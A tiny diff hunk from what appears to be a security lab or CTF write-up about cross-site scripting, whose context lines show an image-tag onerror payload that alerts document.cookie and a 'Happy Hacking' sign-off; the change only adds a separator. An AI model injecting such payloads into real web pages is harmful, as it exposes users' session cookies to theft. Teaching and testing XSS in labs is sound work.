@@ -31,3 +31,5 @@ _payload of low level also works here: _
 payload=`<img src=x onerror="alert(document.cookie)">`
 
 Happy Hacking
+
+---
